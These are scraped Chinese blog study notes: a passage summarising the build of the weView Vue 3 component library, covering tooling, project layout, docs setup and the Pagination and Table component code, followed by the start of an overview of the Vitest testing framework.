组件模板： plop.js 依赖管理： lint-deps 目录规范 如何编写文档站？ 组件库一般有一个演示站点。 对于移动端组件库，可以通过 webpack 别名的方法重写它们的组件，以支持移动端预览，方便 UI 验收。 对于国际化的组件，可以提供类似 vconsole 形式的 devtools，可视化切换 dark/light Mode、rtl/lrt 等能力，提高开发和测试流程中的效率。 常见的文档站技术选型： docz：一个非常成熟的 md 文档站工具，同样支持嵌入 react 组件 dumi：还能支持组件调试 changelog Github Pages vitepress storybook remark docsearch 核心需求 通用型组件: 比如 Button, Icon 等 布局型组件: 比如 Grid, Layout 布局等 导航型组件: 比如面包屑 Breadcrumb, 下拉菜单 Dropdown, 菜单 Menu 等 数据录入型组件: 比如 form 表单, Switch 开关, Upload 文件上传，日期选择，下拉选择等 数据展示型组件: 比如 Avator 头像, Table 表格, List 列表等 反馈型组件: 比如 Progress 进度条, Drawer 抽屉, Modal 对话框等 具体效果，可参考 antd。 技术选用 核心技术栈 ts +vue3 sass vite 测试工具 vitest 规范工具 代码提交规范：husky（提交时自动检查）+ commitlint（提交信息样式检查） 代码风格：eslint（语法）+ prettier（格式）+ husky（提交时自动检查） 文档工具 vitepress 包管理工具 pnpm 项目结构 . ├── .husky # gi t提交时触发的钩子函数 ├── config # 配置文件 ├── coverage # 覆盖率报告 ├── demo # 代码范例 ├── docs # 静态站点相关配置 ├── internal # 里面放置的有 eslint 配置、打包配置 ├── node_modules ├── packages # 项目的核心目录，组件的编写 ├── scripts # 脚本发布、提交信息检查 ├── src # 组件代码 └── types # TS类型定义 组件目录结构 以 button 组件为例： ├── src # 组件代码 └── button # 组件包名 ├── index.ts # 组件入口 ├── Button.tsx # 组件代码 └── __tests__ # 测试用例 └── Button.spec.ts 包名：小写 + 中划线； 统一入口文件： index.ts； 组件代码： 大驼峰； 测试用例代码 ： 测试对象名+ .spec.ts。 以 button 组件为例子的测试： 定义测试文件 src/button/__tests__/Button.test.ts。 1. 在测试文件中创建一个 `describe` 分组。 2. 在第一个参数中输入 `'Button'`，表明是针对 `Button` 组件的测试。 3. 编写测试用例 `test`。 4. 使用 `shallowMount` 初始化组件，测试按钮是否工作正常，只需要断言判断按钮中的字符串是否正确就可以了。 配置 package.json。 在控制台启动测试命令，并查看结果。 pnpm test 在代码编写阶段，建议只对重点功能进行测试，没必要一定追求过高的测试覆盖率。 monorepo pnpm 原生支持 monorepo 方案： pnpm-workspace.yaml 定义了工作空间的根目录。 如果我们要单独对某一个项目下安装一些包时，可以到该项目目录下安装，或者在根目录下使用 pnpm i 包 --filter 项目名。 当我们要在根目录下安装某些包，需要加上 -w 后缀。 # pnpm-workspace.yaml packages: - packages/* - docs - play - internal/* git flow 代码提交形式为：type: 提交信息。 主要有以下分支： main 分支：跟线上发布版本保持一致 develop 分支：开发的主分支，保证最新的代码 其他分支：完成一个新的功能时用到的分支 需要注意的是： main 分支不要动！ 当功能完成之后需要合并时，合并到 develop 分支，注意合并之前先拉取 develop 分支，合并时建议多使用 rebase 指令，保证提交记录的简洁 文档 在 packages/components/index.ts 中按格式导出组件。 import { App } from 'vue' import DateTimePicker from './DatePicker/DateTimePicker/DateTimePicker.vue' import Input from './input/Input.vue' import Pagination from './Pagination/index' import WvTable from './Table/index' import WvRadio from './Table/radio' import Button from &quot;./Button/src/Button.vue&quot;; import Col from './Layout/src/col.vue'; import Row from './Layout/src/row.vue' import Notification from './notification/Notification.vue' import { Dropdown, DropdownItem, DropdownMenu } from './Dropdown' import WVcarousel from './carousel/WV-carousel.vue' // 导出单独组件 export { DateTimePicker, Input, Pagination, Button, Col, Row, Notification, WvTable, WvRadio, Dropdown, DropdownMenu, DropdownItem } // 编写一个插件，实现一个install方法 export default { install(app: App): void { app.component('DateTimePicker', DateTimePicker); app.component('Input', Input); app.component('Pagination', Pagination); app.component('WvTable', WvTable) app.component('WvRadio', WvRadio) app.component('WButton', Button); app.component('WRow', Row); app.component('WCol', Col); app.component(Notification.name, Notification) app.component('WDropdown', Dropdown) app.component('WDropdownMenu', DropdownMenu) app.component('WDropdownItem', DropdownItem) app.component(&quot;WVcarousel&quot;, WVcarousel); }, } 配置 docs/.vitepress/config.ts，添加左侧导航栏条目。 const sidebar = { '/': [ { text: '快速开始', link: '/' }, { text: '通用', children: [ { text: 'Button 按钮', link: '/components/Button/' }, { text: 'Layout 布局', link: '/components/Layout/' }, ] }, { text: 'Form表单组件', children: [ { text: 'DateTimePicker 日期选择器', link: '/components/DateTimePicker/' }, { text: 'Input 输入框', link: '/components/Input/' }, ] }, { text: 'Data 数据展示', children: [ { text: 'Table 表格', link: '/components/Table/' }, { text: 'Pagination 分页', link: '/components/Pagination/' } ] }, { text: 'Feedback 反馈组件', children: [ { text: 'Notification 通知', link: '/components/Notification/' } ] }, { text: 'Navigation 导航', children: [ { text: 'Dropdown 下拉菜单', link: '/components/Dropdown/' } ] }, { text: 'Others 其他', children: [ { text: 'carousel 轮播图', link: '/components/carousel/' } ] }, ] } export default { title: &quot;🔨 weView&quot;, themeConfig: { sidebar, }, markdown: { config: (md) =&gt; { const { demoBlockPlugin } = require('vitepress-theme-demoblock') md.use(demoBlockPlugin) } } } 新建主题配置文件 docs/.vitepress/theme/index.ts，导入默认主题、已安装主题、在 packages/components/index.ts 中导出的组件和需要的字体样式文件。 import DefaultTheme from 'vitepress/theme' // 主题样式 import 'vitepress-theme-demoblock/theme/styles/index.css' // 插件的组件，主要是demo组件 import Demo from 'vitepress-theme-demoblock/components/Demo.vue' import DemoBlock from 'vitepress-theme-demoblock/components/DemoBlock.vue' import weView from '../../../packages/components/index.ts' import '../../../packages/fonts/iconfont.css' export default { ...DefaultTheme, enhanceApp({ app }) { app.use(weView) app.component('Demo', Demo) app.component('DemoBlock', DemoBlock) }, } 在 docs/components/ 下面新建组件名称文件夹，名字为 link 属性值对应路径 /components/ 后的单词。 在组件名称文件夹中新建 index.md 文件，可以在里面引入和使用外部 Vue 组件。例如： :::demo 基础使用 ```vue &lt;template&gt; &lt;Input v-model=&quot;inputText2&quot; placeholder=&quot;请输入...&quot; clearable/&gt; &lt;/template&gt; &lt;script&gt; import { ref } from 'vue' export default { setup() { const inputText2 = ref('') return { inputText2 } }, } &lt;/script&gt; \\``` ::: 会渲染出以下内容： 分页和表格 因为我负责的是 Pagination 和 Table 组件，但 Ant Design Vue 和 Element Plus 的表格组件都太复杂了，所以我参考的是较简单的 layui - vue。 Pagination HTML 结构 &lt;template&gt; &lt;div class=&quot;pager pager-default&quot;&gt; &lt;!-- 辅助标签, 为 total computed 逻辑正常执行而创建的临时标签 --&gt; &lt;div style=&quot;display: none&quot;&gt;{{ totalPage }}&lt;/div&gt; &lt;span v-if=&quot;showCount&quot; class=&quot;pager-count&quot;&gt;共 {{ total }} 条 {{ maxPage }} 页&lt;/span&gt; &lt;a href=&quot;javascript:;&quot; class=&quot;pager-prev&quot; :class=&quot;[ currentPage === 1 ? 'disabled' : '', theme &amp;&amp; currentPage !== 1 ? 'pager-a-' + theme : '', ]&quot; @click=&quot;prev()&quot;&gt; &lt;slot v-if=&quot;slots.prev&quot; name=&quot;prev&quot; /&gt; &lt;template v-else&gt;上一页&lt;/template&gt; &lt;/a&gt; &lt;template v-if=&quot;showPage&quot;&gt; &lt;template v-for=&quot;index of totalPage&quot; :key=&quot;index&quot;&gt; &lt;span v-if=&quot;index === currentPage&quot; class=&quot;pager-curr&quot;&gt; &lt;em class=&quot;pager-em&quot; :class=&quot;[theme ? 'bg-' + theme : '']&quot; /&gt; &lt;em&gt;{{ index }}&lt;/em&gt; &lt;/span&gt; &lt;a v-else href=&quot;javascript:;&quot; @click=&quot;jump(index)&quot; :class=&quot;[theme ? 'pager-a-' + theme : '']&quot;&gt;{{ index }}&lt;/a&gt; &lt;/template&gt; &lt;/template&gt; &lt;a href=&quot;javascript:;&quot; class=&quot;pager-next&quot; :class=&quot;[ currentPage === maxPage || maxPage === 0 ? 'disabled' : '', theme &amp;&amp; currentPage !== maxPage &amp;&amp; maxPage !== 0 ? 'pager-a-' + theme : '', ]&quot; @click=&quot;next()&quot;&gt; &lt;slot v-if=&quot;slots.next&quot; name=&quot;next&quot; /&gt; &lt;template v-else&gt;下一页&lt;/template&gt; &lt;/a&gt; &lt;span v-if=&quot;showLimit&quot; class=&quot;pager-limits&quot;&gt; &lt;select v-model=&quot;inlimit&quot; @change=&quot;changelimit&quot;&gt; &lt;option v-for=&quot;val of limits&quot; :key=&quot;val&quot; :value=&quot;val&quot;&gt; {{ val }} 条/页 &lt;/option&gt; &lt;/select&gt; &lt;/span&gt; &lt;a v-if=&quot;showRefresh&quot; href=&quot;javascript:;&quot; @click=&quot;refresh&quot; class=&quot;pager-refresh&quot;&gt; &lt;i class=&quot;wv-icon wv-icon-refresh&quot; /&gt; &lt;/a&gt; &lt;span v-if=&quot;props.showSkip&quot; class=&quot;pager-skip&quot;&gt; 到第 &lt;input v-model=&quot;currentPageShow&quot; @keypress.enter=&quot;jumpPage()&quot; type=&quot;number&quot; class=&quot;input input-number&quot; /&gt;页 &lt;button type=&quot;button&quot; class=&quot;pager-btn&quot; @click=&quot;jumpPage()&quot; :disabled=&quot;currentPageShow &gt; maxPage || currentPageShow == currentPage&quot;&gt; 确认 &lt;/button&gt; &lt;/span&gt; &lt;/div&gt; &lt;/template&gt; 最外层是分页组件容器（div.pager），内容从左到右为：总条数和总页数文本（span）、上一页链接（a）、页码（template&gt;span&gt;em）、下一页链接（a）、每页数量选择框（span&gt;select）、刷新按钮图标（a&gt;i）、跳转文本、跳转输入框（input）、跳转确定按钮（button）。 有以下插槽： 插槽 描述 默认值 prev 上一页 上一页 next 下一页 下一页 JS 代码 props，有以下属性和默认值： interface PageProps { total: number limit: number theme?: string showPage?: boolean showSkip?: boolean showCount?: boolean showLimit?: boolean showRefresh?: boolean pages?: number limits?: number[] modelValue?: number } const props = withDefaults(defineProps &lt; PageProps &gt; (), { limit: 10, // 每页数量 pages: 10, // 页码链接最大数量 modelValue: 1, // 当前页 theme: 'blue', // 主题色 showPage: false, // 显示页码 showSkip: false, // 显示跳转 showCount: false, // 显示总数 showLimit: true, // 显示每页数量选择框 showRefresh: false, // 显示刷新按钮图标 limits: () =&gt; [10, 20, 30, 40, 50], // 每页数量选择框的选项 }) emits，有以下事件： const emit = defineEmits([ 'update:modelValue', // 当前页变化 'update:limit', // 每页数量选择框的选项变化 'change', // 当前页和每页数量选择框的选项变化 ]) watch，有以下在数据更改时调用的侦听回调： watch( // 监听传入每页数量参数时，赋值给 inlimit () =&gt; props.limit, () =&gt; { inlimit.value = props.limit } ) watch(inlimit, () =&gt; { // 监听每页数量选择框的选项变化时，触发事件 emit('update:limit', inlimit.value) }) watch(currentPage, () =&gt; { // 监听当前页码变化时，更新 currentPage、currentPageShow 的值，触发事件 const min = totalPage.value[0] const max = totalPage.value[totalPage.value.length - 1] if (currentPage.value &gt; max) currentPage.value = max if (currentPage.value &lt; min) currentPage.value = min currentPageShow.value = currentPage.value emit('update:modelValue', currentPage.value) }) watch( // 监听传入当前页码参数时，更新 currentPage、currentPageShow 的值 () =&gt; props.modelValue, () =&gt; { currentPage.value = props.modelValue currentPageShow.value = currentPage.value } ) Table HTML 结构 &lt;template&gt; &lt;div ref=&quot;tableRef&quot;&gt; &lt;table class=&quot;wv-hide&quot; wv-filter=&quot;test&quot; /&gt; &lt;div class=&quot;wv-form wv-border-box wv-table-view&quot; :class=&quot;classes&quot;&gt; &lt;div v-if=&quot;defaultToolbar || slot.toolbar&quot; class=&quot;wv-table-tool&quot;&gt; &lt;div class=&quot;wv-table-tool-temp&quot;&gt; &lt;slot name=&quot;toolbar&quot; /&gt; &lt;/div&gt; &lt;div v-if=&quot;defaultToolbar&quot; class=&quot;wv-table-tool-self&quot;&gt; &lt;!-- 筛选 --&gt; &lt;wv-dropdown v-if=&quot;showToolbar('filter')&quot; updateAtScroll :style=&quot;toolbarStyle('filter')&quot;&gt; &lt;div class=&quot;wv-inline&quot; title=&quot;筛选&quot; wv-event&gt; &lt;i class=&quot;wv-icon wv-icon-slider&quot; /&gt; &lt;/div&gt; &lt;template #content&gt; &lt;div class=&quot;wv-table-tool-checkbox&quot;&gt; &lt;wv-checkbox v-for=&quot;column in tableHeadColumns[0]&quot; v-model=&quot;tableColumnKeys&quot; skin=&quot;primary&quot; :disabled=&quot;!!column.children&quot; :key=&quot;column.key&quot; :value=&quot;column.key&quot;&gt;{{ column.title }}&lt;/wv-checkbox&gt; &lt;/div&gt; &lt;/template&gt; &lt;/wv-dropdown&gt; &lt;!-- 导出 --&gt; &lt;div v-if=&quot;showToolbar('export')&quot; class=&quot;wv-inline&quot; title=&quot;导出&quot; wv-event :style=&quot;toolbarStyle('export')&quot; @click=&quot;exportData()&quot;&gt; &lt;i class=&quot;wv-icon wv-icon-export&quot; /&gt; &lt;/div&gt; &lt;!-- 打印 --&gt; &lt;div v-if=&quot;showToolbar('print')&quot; :style=&quot;toolbarStyle('print')&quot; class=&quot;wv-inline&quot; title=&quot;打印&quot; wv-event @click=&quot;print()&quot;&gt; &lt;i class=&quot;wv-icon wv-icon-print&quot; /&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;wv-table-box-header&quot; v-if=&quot;slot.header&quot;&gt; &lt;slot name=&quot;header&quot; /&gt; &lt;/div&gt; &lt;div class=&quot;wv-table-box&quot;&gt; &lt;!-- 表头 --&gt; &lt;div class=&quot;wv-table-header&quot;&gt; &lt;!-- :style=&quot;[{ 'padding-right': `${scrollWidthCell}px` }]&quot; --&gt; &lt;div class=&quot;wv-table-header-wrapper&quot; ref=&quot;tableHeader&quot;&gt; &lt;table class=&quot;wv-table&quot; :wv-size=&quot;size&quot; :wv-skin=&quot;skin&quot; ref=&quot;tableHeaderTable&quot;&gt; &lt;colgroup&gt; &lt;template v-for=&quot;column in tableBodyColumns&quot; :key=&quot;column&quot;&gt; &lt;template v-if=&quot;tableColumnKeys.includes(column.key)&quot;&gt; &lt;col :width=&quot;column.width&quot; :style=&quot;{ minWidth: column.minWidth ? column.minWidth : '50px', }&quot; /&gt; &lt;/template&gt; &lt;/template&gt; &lt;/colgroup&gt; &lt;thead&gt; &lt;template v-for=&quot;( tableHeadColumn, tableHeadColumnIndex ) in tableHeadColumns&quot; :key=&quot;tableHeadColumnIndex&quot;&gt; &lt;tr&gt; &lt;template v-for=&quot;(column, columnIndex) in tableHeadColumn&quot; :key=&quot;column&quot;&gt; &lt;th v-if=&quot;tableColumnKeys.includes(column.key)&quot; :colspan=&quot;column.colspan&quot; :rowspan=&quot;column.rowspan&quot; class=&quot;wv-table-cell&quot; :class=&quot;[ renderFixedClassName(column, columnIndex), column.fixed ? `wv-table-fixed-${column.fixed}` : '', column.type == 'checkbox' ? 'wv-table-cell-checkbox' : '', column.type == 'radio' ? 'wv-table-cell-radio' : '', column.type == 'number' ? 'wv-table-cell-number' : '', ]&quot; :style=&quot;[ { textAlign: column.align, }, renderHeadFixedStyle( column, columnIndex, tableHeadColumn, tableHeadColumnIndex, tableHeadColumns ), ]&quot;&gt; &lt;template v-if=&quot;column.type == 'checkbox'&quot;&gt; &lt;wv-checkbox v-model=&quot;hasChecked&quot; :is-indeterminate=&quot;!allChecked&quot; skin=&quot;primary&quot; value=&quot;all&quot; @change=&quot;changeAll&quot; /&gt; &lt;/template&gt; &lt;template v-else&gt; &lt;span&gt; &lt;template v-if=&quot;column.titleSlot&quot;&gt; &lt;slot :name=&quot;column.titleSlot&quot; /&gt; &lt;/template&gt; &lt;template v-else&gt; {{ column.title }} &lt;/template&gt; &lt;/span&gt; &lt;!-- 插槽 --&gt; &lt;span v-if=&quot;column.sort&quot; class=&quot;wv-table-sort wv-inline&quot; wv-sort&gt; &lt;i @click.stop=&quot;sortTable($event, column.key, 'asc')&quot; class=&quot;wv-edge wv-table-sort-asc&quot; title=&quot;升序&quot; /&gt; &lt;i @click.stop=&quot; sortTable($event, column.key, 'desc') &quot; class=&quot;wv-edge wv-table-sort-desc&quot; title=&quot;降序&quot; /&gt; &lt;/span&gt; &lt;/template&gt; &lt;/th&gt; &lt;/template&gt; &lt;/tr&gt; &lt;/template&gt; &lt;/thead&gt; &lt;/table&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- 表身 --&gt; &lt;div class=&quot;wv-table-body wv-table-main&quot; :style=&quot;{ height: height, maxHeight: maxHeight }&quot; ref=&quot;tableBody&quot;&gt; &lt;table class=&quot;wv-table&quot; v-if=&quot;tableDataSource.length &gt; 0 &amp;&amp; loading == false&quot; :class=&quot;{ 'wv-table-even': props.even }&quot; :wv-size=&quot;size&quot; :wv-skin=&quot;skin&quot;&gt; &lt;colgroup&gt; &lt;template v-for=&quot;(column, columnIndex) in tableBodyColumns&quot; :key=&quot;columnIndex&quot;&gt; &lt;template v-if=&quot;tableColumnKeys.includes(column.key)&quot;&gt; &lt;col :width=&quot;column.width&quot; :style=&quot;{ minWidth: column.minWidth ? column.minWidth : '50px', }&quot; /&gt; &lt;/template&gt; &lt;/template&gt; &lt;/colgroup&gt; &lt;tbody&gt; &lt;!-- 渲染 --&gt; &lt;template v-for=&quot;(children, index) in tableDataSource&quot; :key=&quot;index&quot;&gt; &lt;table-row :id=&quot;id&quot; :index=&quot;index&quot; :data=&quot;children&quot; :page=&quot;page&quot; :columns=&quot;tableBodyColumns&quot; :columnSlotNames=&quot;columnSlotNames&quot; :indent-size=&quot;indentSize&quot; :currentIndentSize=&quot;currentIndentSize&quot; :tableColumnKeys=&quot;tableColumnKeys&quot; :expandSpace=&quot;childrenExpandSpace&quot; :expandIndex=&quot;expandIndex&quot; :cellStyle=&quot;cellStyle&quot; :cellClassName=&quot;cellClassName&quot; :rowStyle=&quot;rowStyle&quot; :rowClassName=&quot;rowClassName&quot; :spanMethod=&quot;spanMethod&quot; :defaultExpandAll=&quot;defaultExpandAll&quot; :getCheckboxProps=&quot;getCheckboxProps&quot; :getRadioProps=&quot;getRadioProps&quot; v-model:expandKeys=&quot;tableExpandKeys&quot; v-model:selectedKeys=&quot;tableSelectedKeys&quot; v-model:selectedKey=&quot;tableSelectedKey&quot; @row=&quot;rowClick&quot; @row-double=&quot;rowDoubleClick&quot; @row-contextmenu=&quot;rowContextmenu&quot;&gt; &lt;template v-for=&quot;name in columnSlotNames&quot; #[name]=&quot;slotProp: { data: any, column: any, row: any, rowIndex: number, columnIndex: number, }&quot;&gt; &lt;slot :name=&quot;name&quot; :row=&quot;slotProp.data&quot; :data=&quot;slotProp.data&quot; :column=&quot;slotProp.column&quot; :rowIndex=&quot;slotProp.rowIndex&quot; :columnIndex=&quot;slotProp.columnIndex&quot; /&gt; &lt;/template&gt; &lt;template v-if=&quot;slot.expand&quot; #expand=&quot;slotProp: { data: any, row: any }&quot;&gt; &lt;slot name=&quot;expand&quot; :data=&quot;slotProp.data&quot; :row=&quot;slotProp.row&quot; /&gt; &lt;/template&gt; &lt;/table-row&gt; &lt;/template&gt; &lt;tr v-if=&quot;hasTotalRow&quot; class=&quot;wv-table-total&quot;&gt; &lt;template v-for=&quot;(column, columnIndex) in columns&quot; :key=&quot;columnIndex&quot;&gt; &lt;template v-if=&quot;tableColumnKeys.includes(column.key)&quot;&gt; &lt;td :style=&quot;[ { textAlign: column.align, whiteSpace: column.ellipsisTooltip ? 'nowrap' : 'normal', }, renderFixedStyle(column, columnIndex), ]&quot; :class=&quot;[ 'wv-table-cell', renderFixedClassName(column, columnIndex), column.fixed ? `wv-table-fixed-${column.fixed}` : '', ]&quot; v-html=&quot;renderTotalRowCell(column)&quot; /&gt; &lt;/template&gt; &lt;/template&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;template v-if=&quot;tableDataSource.length == 0 &amp;&amp; loading == false&quot;&gt; &lt;wv-empty /&gt; &lt;div :style=&quot;{ width: tableBodyEmptyWidth }&quot; /&gt; &lt;/template&gt; &lt;template v-if=&quot;loading == true&quot;&gt; &lt;div class=&quot;wv-table-loading&quot;&gt; &lt;i class=&quot;wv-icon-loading wv-icon wv-anim wv-anim-rotate wv-anim-loop&quot; /&gt; &lt;/div&gt; &lt;/template&gt; &lt;/div&gt; &lt;div class=&quot;wv-table-footer&quot; v-if=&quot;slot.footer&quot;&gt; &lt;slot name=&quot;footer&quot; /&gt; &lt;/div&gt; &lt;/div&gt; &lt;div v-if=&quot;page &amp;&amp; page.total &gt; 0&quot; class=&quot;wv-table-page&quot;&gt; &lt;table-page :total=&quot;page.total&quot; :pages=&quot;page.pages&quot; :theme=&quot;page.theme&quot; :limits=&quot;page.limits&quot; :showSkip=&quot;page.showSkip&quot; :show-page=&quot;page.showPage&quot; :showRefresh=&quot;page.showRefresh&quot; :showLimit=&quot;page.showLimit&quot; :showCount=&quot;page.showCount&quot; v-model:current=&quot;page.current&quot; v-model:limit=&quot;page.limit&quot; @change=&quot;change&quot; /&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/template&gt; 最外层是表格组件容器（div.wv-table-view），内容从上到下为：工具栏（div.wv-table-tool）、header插槽（div.wv-table-box-header）、表格（div.wv-table-box）、分页（div.wv-table-page）。 有以下插槽： 插槽 描述 参数 toolbar 自定义工具栏 -- header 顶部扩展 -- footer 底部扩展 -- column.titleSlot 列标题 expand 嵌套面板 { row } customSlot 自定义列插槽 { row，rowIndex，column，columnIndex } JS 代码 props，有以下属性和默认值： interface TableProps { id?: string skin?: string size?: string page?: Recordable columns: Recordable[] dataSource: Recordable[] defaultToolbar?: boolean | any[] selectedKey?: string selectedKeys?: Recordable[] indentSize?: number childrenColumnName?: string height?: number maxHeight?: string even?: boolean expandIndex?: number rowClassName?: string | Function cellClassName?: string | Function rowStyle?: string | Function cellStyle?: string | Function spanMethod?: Function defaultExpandAll?: boolean expandKeys?: Recordable[] loading?: boolean getCheckboxProps?: Function getRadioProps?: Function } const props = withDefaults(defineProps&lt;TableProps&gt;(), { id: 'id', // 主键 size: 'md', // 尺寸 indentSize: 30, // 树表行级缩进 childrenColumnName: 'children', // 树节点字段 dataSource: () =&gt; [], // 数据源 selectedKeys: () =&gt; [], // 选中项 (多选) defaultToolbar: false, // 工具栏 selectedKey: '', // 选中项 (单选) maxHeight: 'auto', // 表格最大高度 even: false, // 斑马条纹 rowClassName: '', // 行类名称 cellClassName: '', // 列类名称 expandIndex: 0, // 展开所在列 rowStyle: '', // 行样式 cellStyle: '', // 列样式 defaultExpandAll: false, // 默认展开所有列 spanMethod: () =&gt; {}, // 合并算法 expandKeys: () =&gt; [], // 展开的列 loading: false, // 加载动画 getCheckboxProps: () =&gt; {}, // 多选行属性 getRadioProps: () =&gt; {}, // 单选行属性 }) emits，有以下事件： const emit = defineEmits([ 'update:current', // 当前页变化 'update:limit', // 每页数量选择框的选项变化 'change', // 当前页和每页数量选择框的选项变化 'update:expandKeys', // 展开树节点 'update:selectedKeys', // 多选行选中 'update:selectedKey', // 单选行选中 'row-contextmenu', // 行右击 'row-double', // 行双击 'row', // 行单击 ]) watch，有以下在数据更改时调用的侦听回调： watch( // 监听传入高度、数据源参数变化时，更新表格滚动宽度 () =&gt; [props.height, props.maxHeight, props.dataSource], () =&gt; { nextTick(() =&gt; { getScrollWidth() }) } ) watch( // 监听 columns 变化时，计算列内容 tableColumns, () =&gt; { tableColumnKeys.value = [] tableBodyColumns.value = [] tableHeadColumns.value = [] findFindNode(tableColumns.value) findFindNodes(tableColumns.value) findFinalNode(0, tableColumns.value) }, { immediate: true } ) watch( // 监听传入多选行选中参数变化时，更新 tableSelectedKeys () =&gt; props.selectedKeys, () =&gt; { tableSelectedKeys.value = props.selectedKeys }, { deep: true } ) watch( // 监听传入树节点展开参数变化时，更新 tableExpandKeys () =&gt; props.expandKeys, () =&gt; { tableExpandKeys.value = props.expandKeys }, { deep: true } ) watch( // 监听传入数据源参数变化时，更新 tableDataSource、tableSelectedKeys、tableSelectedKey () =&gt; props.dataSource, () =&gt; { tableDataSource.value = [...props.dataSource] tableSelectedKeys.value = [] tableSelectedKey.value = s }, { deep: true } ) watch( // 监听多选行选中变化时，更新 allChecked、hasChecked（图标改变），触发事件 tableSelectedKeys, () =&gt; { if (tableSelectedKeys.value.length === props.dataSource.length) { allChecked.value = true } else { allChecked.value = false } if (tableSelectedKeys.value.length &gt; 0) { hasChecked.value = true } else { hasChecked.value = false } emit('update:selectedKeys', tableSelectedKeys.value) }, { deep: true, immediate: true } ) watch( // 监听展开树节点时，触发事件 tableExpandKeys, () =&gt; { emit('update:expandKeys', tableExpandKeys.value) }, { deep: true, immediate: true } ) 项目地址 项目地址：https://github.com/linhr123/weView 演示地址：https://zzy003527.github.io ","link":"https://zkrisj.github.io/post/qing-xun-ying-da-xiang-mu-zong-jie-or-qing-xun-ying-bi-ji/"},{"title":"Vitest 知识总结 ｜ 青训营笔记","content":"Vitest 简介 由 Vite 提供支持的极速原生的单元测试框架。安装 pnpm add -D vitest，Vitest 需要 Vite &gt;=v3.0.0 和 Node &gt;=v14。 Vite 支持 重复使用 Vite 的配置、转换器、解析器和插件 - 在您的应用程序和测试中保持一致。 兼容 Jest 拥有预期、快照、覆盖等 - 从 Jest 迁移很简单。 智能即时浏览模式 智能文件监听模式，就像是测试的 HMR！ ESM, TypeScript, JSX 由 esbuild 提供的开箱即用 ESM、TypeScript 和 JSX 支持。 Vitest 跟其他的测试框架进行对比 Vitest 和基于浏览器的运行器之间的主要区别是速度和执行上下文。简而言之，基于浏览器的运行器，如 Cypress，可以捕捉到基于 Node 的运行器（如 Vitest）所不能捕捉的问题（比如样式问题、原生 DOM 事件、Cookies、本地存储和网络故障），但基于浏览器的运行器比 Vitest 慢几个数量级，因为它们要执行打开浏览器，编译样式表以及其他步骤。 Jest Jest 通过为大多数的 JavaScript 项目提供了开箱即用的测试支持，填补了测试框架的空白，有着舒适的 API（例如 it 和 expect），以及大多数所需要的全套测试功能（例如快照，对象模拟，代码测试覆盖率）。 如果你的项目由 Vite 驱动，Jest 和 Vite 之间有很多重复的部分，让用户不得不创建两个不同的配置文件。配置和维护两个不同的容器是一件极其不合理的操作。使用 Vitest，你就可以将开发，构建和测试环境的配置定义为单个容器，共享相同的插件和 vite.config.js。同时可以通过相同的插件 API 进行扩展，与 Vite 形成完美的集成。 由于 Jest 的使用规模，Vitest 提供了与之兼容的 API，允许在大多数项目中将其作为备选使用，同时还包括了单元测试时最常见的功能（模拟，快照以及覆盖率）。Vitest 与大多数 Jest API 和生态系统库都有较好的兼容性，因此在大多数项目中，可以无缝的将 Jest 替换成 Vitest 。 Cypress Cypress 是著名的端到端测试工具，是基于浏览器的测试工具，是 Vitest 的补充工具之一。 基于浏览器运行测试的框架（Cypress、Web Test），会捕获到 Vitest 无法捕获的问题，因为他们都是使用真实的浏览器和 APIs。相比之下，Vitest 专注于为非浏览器逻辑提供最佳的开发体验。如果你想使用 Cypress，建议将 Vitest 用于测试项目中非浏览器逻辑，将 Cypress 用于测试依赖浏览器的逻辑。 Cypress 更像是一个 IDE 而不是测试框架，因为您还可以在浏览器中看到真实呈现的组件，以及它的测试结果和日志。Cypress 还尝试将 Vite 集成进他们自己的产品中：使用 Vitesse 重新构建他们的应用程序的 UI，并使用 Vite 来测试驱动他们项目的开发。 Vitest 支持各种实现部分浏览器环境的第三方包，例如 jsdom，可以让我们快速的对于任何引用浏览器 APIs 的代码进行单元测试。但这些浏览器环境在实现上有局限性，例如 jsdom 缺少相当数量的特性，诸如 window.navigation 或者布局引擎（offsetTop 等）。 Cypress 不是对业务代码进行单元测试的好选择，但使用 Cypress（用于端对端和组件测试）配合 Vitest（用于非浏览器逻辑的单元测试）将满足你应用程序的测试需求。 Vitest 主要功能 与 Vite 通用的配置、转换器、解析器和插件。 使用你的应用程序中的相同配置来进行测试！ 智能文件监听模式（默认启用），就像是测试的 HMR！ 支持测试 Vue、React、Lit 等框架中的组件。 开箱即用的 ES Module / TypeScript / JSX support / PostCSS ESM 优先，支持模块顶级 await 注重性能，通过 tinypool 使用 Worker 线程尽可能多地并发运行 使用 Tinybench 来支持基准测试 套件和测试的过滤、超时、并发配置 Jest 的快照功能 内置 Chai 进行断言 + 与 Jest expect 语法兼容的 API 内置用于对象模拟(Mock)的 Tinyspy 使用 jsdom 或 happy-dom 用于 DOM 模拟 通过 c8 来输出代码测试覆盖率 类似于 Rust 语言的 源码内联测试 通过 expect-type 进行类型测试 测试环境 Vitest 提供 environment 选项以在特定环境中运行代码，可以使用 environmentOptions 选项修改环境的行为方式。默认情况下，可以使用这些环境： node 为默认环境 jsdom 通过提供 Browser API 模拟浏览器环境，使用 jsdom 包 happy-dom 通过提供 Browser API 模拟浏览器环境，被认为比 jsdom 更快，但缺少一些 API，使用 happy-dom 包 edge-runtime 模拟 Vercel 的 edge-runtime，使用 @edge-runtime/vm 包 设置 environment 选项时，它将应用于项目中的所有测试文件。要获得更细粒度的控制，可以使用控制注释为特定文件指定环境，以 @vitest-environment 开头，后跟环境名称的注释： // @vitest-environment jsdom import { test } from 'vitest' test('test', () =&gt; { expect(typeof window).not.toBe('undefined') }) 也可以通过设置 environmentMatchGlobs 选项，根据 glob 模式指定环境。 从 0.23.0 开始，你可以创建自己的包，名为 vitest-environment-${name}，来扩展 Vitest 环境。该包应导出一个具有 Environment 属性的对象： import type { Environment } from 'vitest' export default &lt;Environment&gt;{ name: 'custom', setup() { // custom setup return { teardown() { // called after all tests with this env have been run }, } }, } 可以通过 vitest/environments 访问默认的 Vitest 环境： import { builtinEnvironments, populateGlobal } from 'vitest/environments' console.log(builtinEnvironments) // { jsdom, happy-dom, node, edge-runtime } populateGlobal 实用函数用于将属性从对象移动到全局命名空间。 测试上下文 Vitest 的测试上下文允许你定义可在测试中使用的工具(utils)、状态(states)和固定装置(fixtures)。 